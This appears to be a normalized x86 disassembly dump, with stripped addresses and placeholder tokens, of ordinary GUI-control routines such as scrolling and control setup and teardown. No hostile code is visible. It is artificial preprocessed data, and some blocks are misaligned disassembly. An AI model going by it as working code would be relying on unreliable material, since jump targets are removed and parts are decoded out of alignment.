jmp r-xdata
sub_45ab08
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x24 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x24 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_45b1f8
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x24 ] eax
sub_45ab80
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebx + 0x14 ]
cmp edx eax
jle r-xdata
mov [ ebx + 0xc ] edx
jmp r-xdata
test edx edx
jge r-xdata
mov edx eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
xor edx edx
mov si 0x1
xor esi esi
jmp r-xdata
movzx edi si
push edi
mov eax [ ebx + 0x4 ]
call sub_448d84
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax [ ebx + 0xc ]
je r-xdata
mov [ ebx + 0xc ] edx
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax [ ebx + 0xc ]
cmp edx eax
je r-xdata
push 0xffffffff
mov eax [ ebx + 0xc ]
push eax
push edi
mov eax [ ebx + 0x4 ]
call sub_448d84
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ecx eax
sub ecx edx
mov eax [ ebx + 0x4 ]
xor edx edx
call sub_44893c
sub eax edx
mov edx eax
xor ecx ecx
mov eax [ ebx + 0x4 ]
call sub_44893c
jmp r-xdata
call sub_45a2f0
test eax eax
je r-xdata
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_45ac44
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x30 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_45b1f8
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x30 ] eax
sub_45acfc
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
cmp bl 0x1
cmc
sbb eax eax
push eax
mov eax [ esi ]
movzx eax [ eax + 0x34 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_448d84
push eax
call sub_4274d8
mov eax [ esi ]
cmp [ eax + 0x24 ] 0x0
jle r-xdata
mov eax [ esi ]
cmp [ eax + 0x38 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x24 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_448d84
push eax
call sub_4274d8
mov eax [ esi ]
cmp [ eax + 0x30 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_448d84
push eax
call sub_4274d8
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x28 ]
call sub_41cd14
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_448d84
push eax
call sub_4274d8
pop esi
pop ebx
pop ebp
retn
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_448d84
push eax
call sub_4274d8
sub_45ae04
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
lea esi [ ebp - 0x4 ]
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
xor ebx ebx
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov bx 0x1
mov [ ebp - 0x22 ] 0x1c
mov [ ebp - 0x1e ] 0x17
xor eax eax
mov [ ebp - 0x1a ] eax
mov eax [ esi ]
cmp [ eax + 0x14 ] 0x0
jle r-xdata
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_45a718
mov edx [ esi ]
mov edi [ edx + 0x10 ]
sub edi eax
mov eax [ esi ]
mov [ eax + 0x14 ] edi
test edi edi
jge r-xdata
xor eax eax
mov [ ebp - 0x16 ] eax
mov eax [ esi ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0x16 ] eax
jmp r-xdata
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
movzx eax bx
mov ecx 0xa
xor edx edx
div ecx
mov edx [ esi ]
mov [ edx + 0x8 ] ax
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_45a718
inc eax
mov [ ebp - 0x12 ] eax
mov eax [ esi ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xe ] eax
mov [ ebp - 0xa ] eax
push ebp
mov eax [ esi ]
mov al [ eax + 0x44 ]
call sub_45acfc
pop ecx
mov eax [ esi ]
mov [ eax + 0x44 ] 0x0
push 0xffffffff
lea eax [ ebp - 0x22 ]
push eax
movzx eax bx
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_448d84
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ esi ]
mov edx [ eax + 0xc ]
mov eax [ esi ]
call sub_45ab80
xor ecx ecx
mov dl 0x1
mov eax [ esi ]
call sub_45a718
lea eax [ eax + eax * 8 ]
mov ecx 0xa
cdq
idiv ecx
mov ebx eax
mov eax [ esi ]
mov [ eax + 0xa ] bx
mov eax [ esi ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
sub_45af1c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_444ab0
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_45a398
mov [ esi + 0x208 ] eax
push 0x1
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_45a398
mov [ esi + 0x20c ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_45af94
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_403344
mov eax [ esi + 0x20c ]
call sub_403344
mov edx ebx
and dl 0xfc
mov eax esi
call sub_444bd4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_45afe0
push ebx
mov ebx eax
mov eax ebx
call sub_445d3c
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov eax ebx
call sub_45b1f8
pop ebx
retn
mov edx 0x1
mov eax 0x5
call sub_40c4ec
test al al
jne r-xdata
mov eax ebx
call sub_448d84
push eax
call sub_42750c
sub_45b020
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_45b178
mov ecx edi
mov edx esi
mov eax ebx
call sub_445484
pop edi
pop esi
pop ebx
retn
sub_45b060
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_45b168
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_441f54
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x208 ]
mov eax ebx
call sub_45a630
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
cmp eax [ ebp - 0x8 ]
jg r-xdata
mov [ ebp - 0x9 ] al
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
call sub_445ab4
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax ebx
call sub_45ab80
mov eax [ ebp - 0x10 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x9 ] 0x0
je r-xdata
inc esi
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_445a78
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_445a78
mov edx eax
mov eax [ ebp - 0x10 ]
call sub_414210
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_441cc0
inc ebx
dec esi
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b16f
mov eax [ ebp - 0x10 ]
call sub_403344
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_45a478
push 0x0
mov edx ebx
mov eax [ ebp - 0x10 ]
call sub_4143bc
xor ecx ecx
mov edx 0xb03e
call sub_443750
inc ebx
dec esi
jne r-xdata
sub_45b19c
push ebx
mov ebx eax
cmp dl [ ebx + 0x210 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x210 ] dl
test dl dl
je r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_45acd0
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_45acd0
mov eax ebx
call sub_45b178
jmp r-xdata
sub_45b1f8
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_449088
test al al
je r-xdata
xor eax eax
push ebp
push sub_45b2e3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_45a798
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_45a798
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov cl 0x1
xor edx edx
call sub_45ae04
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
mov dl 0x1
call sub_45ae04
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
xor edx edx
call sub_45ae04
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_45ae04
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
mov cl 0x1
xor edx edx
call sub_45ae04
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_45ae04
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_45b308
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov esi edx
mov ebx eax
mov edi esp
test esi esi
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x208 ]
movzx eax [ eax + 0x1a ]
sub [ edi ] eax
add [ edi + 0x8 ] eax
mov eax [ ebx + 0x20c ]
movzx eax [ eax + 0x1a ]
sub [ edi + 0x4 ] eax
add [ edi + 0xc ] eax
lea ecx [ esp + 0x18 ]
mov edx edi
mov eax esi
call sub_442068
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_442094
mov eax [ esp + 0x10 ]
mov [ edi ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0x4 ] eax
lea ecx [ esp + 0x18 ]
lea edx [ edi + 0x8 ]
mov eax esi
call sub_442068
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_442094
mov eax [ esp + 0x10 ]
mov [ edi + 0x8 ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0xc ] eax
mov esi [ edi ]
test esi esi
jge r-xdata
mov eax ebx
call sub_441f54
mov ebp [ edi + 0x8 ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x208 ]
mov edx [ eax + 0xc ]
add edx esi
call sub_45ab80
jmp r-xdata
mov esi [ edi + 0x4 ]
test esi esi
jge r-xdata
mov eax ebx
call sub_441f54
sub ebp esi
cmp eax ebp
jge r-xdata
mov eax ebx
call sub_441f98
mov ebp [ edi + 0xc ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
add edx esi
call sub_45ab80
jmp r-xdata
mov esi [ ebx + 0x208 ]
mov eax ebx
call sub_441f54
mov edx [ esi + 0xc ]
add edx [ edi + 0x8 ]
sub edx eax
mov eax esi
call sub_45ab80
mov eax ebx
call sub_441f54
add eax [ edi ]
mov [ edi + 0x8 ] eax
mov eax ebx
call sub_441f98
sub ebp esi
cmp eax ebp
jge r-xdata
mov esi [ ebx + 0x20c ]
mov eax ebx
call sub_441f98
mov edx [ esi + 0xc ]
add edx [ edi + 0xc ]
sub edx eax
mov eax esi
call sub_45ab80
mov eax ebx
call sub_441f98
add eax [ edi + 0x4 ]
mov [ edi + 0xc ] eax
sub_45b45c
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
cmp edi esi
je r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x0
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x0
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_45ab80
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_45ab80
cmp [ ebx + 0x210 ] 0x0
jne r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x1
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x1
mov ebp [ ebx + 0x208 ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
mov ebp [ ebx + 0x20c ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call sub_4062e4
mov edx eax
mov eax ebp
call sub_45acd0
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call sub_4062e4
mov edx eax
mov eax ebp
call sub_45acd0
sub_45b500
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_45b45c
mov ecx edi
mov edx esi
mov eax ebx
call sub_448890
pop edi
pop esi
pop ebx
retn
sub_45b528
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
inc [ eax + 0x214 ]
xor edx edx
push ebp
push sub_45b592
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_447370
xor eax eax
mov edx [ ebx + 0x4 ]
sub edx 0x1
jb r-xdata
xor eax eax
jmp r-xdata
je r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xd0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b599
mov eax [ ebp - 0x4 ]
dec [ eax + 0x214 ]
retn
mov al 0x1
jmp r-xdata
dec edx
je r-xdata
mov al 0x2
jmp r-xdata
sub_45b599
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
xor eax eax
push ebp
push sub_45b5d1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_45b178
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b5d8
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_45b5d8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_45b1f8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
sub_45b64c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_441f98
mov edx [ ebx + 0x20c ]
mov edx [ edx + 0x10 ]
call sub_4248f4
push eax
lea eax [ esp + 0x4 ]
push eax
mov eax ebx
call sub_441f54
mov edx eax
mov edi [ ebx + 0x208 ]
mov eax [ edi + 0x10 ]
call sub_4248f4
mov ecx eax
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
neg edx
mov eax [ edi + 0xc ]
neg eax
call sub_412f2c
push esi
mov edi esi
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx esi
mov eax ebx
call sub_444df0
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_45b6bc
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_45b71d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_4034d0
test al al
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_448100
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b724
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x4 ] edx
retn
mov eax [ ebp - 0x8 ]
mov [ eax + 0x4 ] 0x1
sub_45b74c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_45af1c
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0xb9
mov eax esi
call sub_441d0c
mov edx 0x29
mov eax esi
call sub_441d30
mov [ esi + 0x220 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_45b7ac
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_45afd0
xor eax eax
mov al [ ebx + 0x220 ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x220 ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_45b818
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44839c
pop esi
pop ebx
retn
cmp [ ebx + 0x220 ] 0x1
jne r-xdata
mov eax ebx
call sub_446324
sub_45b844
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
xor ebx ebx
mov [ ebp - 0x114 ] ebx
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45b9a8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_45b988
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov ecx ebx
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xe0 ]
mov eax [ ebp - 0x4 ]
call sub_40328c
cmp eax [ r-xdata ]
je r-xdata
add esp 0xfffffff0
call sub_403668
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b98f
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x1
xor eax eax
push ebp
push sub_45b950
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_41412c
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfe
retn
lea edx [ ebp - 0x110 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_403294
lea eax [ ebp - 0x110 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x114 ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0x114 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcf8
call sub_403ad0
sub_45b9d0
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
test [ ebx + 0x2f4 ] 0x20
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd4 ]
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_403540
and [ ebx + 0x2f4 ] 0xdf
sub_45ba08
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_45af1c
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
xor edx edx
mov eax ebx
call sub_441cc0
xor edx edx
mov eax ebx
call sub_441ce4
mov edx 0x140
mov eax ebx
call sub_441d0c
mov edx 0xf0
mov eax ebx
call sub_441d30
mov dl 0x1
mov eax [ r-xdata ]
call sub_423e38
mov esi eax
mov [ ebx + 0x240 ] esi
push 0x31
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
push 0x32
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax [ ebx + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebx + 0x240 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_45c324
mov dl 0x1
mov eax [ r-xdata ]
call sub_41db18
mov esi eax
mov [ ebx + 0x238 ] esi
mov eax esi
mov edx ebx
call sub_44112c
mov al [ r-xdata ]
mov [ ebx + 0x228 ] al
mov [ ebx + 0x229 ] 0x2
mov [ ebx + 0x22b ] 0x0
mov [ ebx + 0x231 ] 0x3
mov [ ebx + 0x244 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ ebx + 0x25c ] eax
mov [ ebx + 0x235 ] 0x1
mov eax ebx
call sub_40328c
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x2e1 ] 0xff
xor eax eax
mov [ ebx + 0x2ec ] eax
xor edx edx
mov eax ebx
call sub_45c688
xor edx edx
mov eax ebx
call sub_442714
xor edx edx
mov eax ebx
call sub_44267c
mov dl 0x1
mov eax ebx
call sub_448ec4
mov edx ebx
mov eax [ rw-data ]
call sub_460cec
mov [ ebx + 0x2e4 ] 0xa
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_45bb81
add [ eax ] al
add [ ebx - 0x75 ] dl
fsub [ ecx + rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov eax ebx
call sub_41a050
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
mov edx ebx
call sub_414500
xor edx edx
mov eax ebx
call sub_416fd4
cmp [ ebx + 0x264 ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0xc ]
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
mov eax ebx
call sub_45fb94
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd8 ]
sub_45bbec
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_4036d0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
xor eax eax
push ebp
push sub_45bcb6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x234 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45e510
mov eax [ ebp - 0x4 ]
call sub_449088
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xd8 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_460d24
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_403344
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
call sub_403344
mov eax [ ebp - 0x4 ]
add eax 0x2f0
call sub_40d6a0
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_45af94
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45bcbd
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xac ]
sub_45bcd0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2d2 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
xor eax eax
push ebp
push j_sub_4037e4#4
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2d4 ]
call [ ebx + 0x2d0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_45c688
sub_45bd16
mov eax [ ebp - 0x4 ]
mov si 0xffad
call sub_403540
test al al
jne r-xdata
call sub_403b4c
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
call sub_403af8
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_45c688
sub_45bd4c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2da ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_45bd8d
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2dc ]
call [ ebx + 0x2d8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_45bdac
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_444658
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi eax
xor eax eax
mov [ ebx + 0x220 ] eax
mov eax edi
mov si 0xffb8
call sub_403540
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_45e054
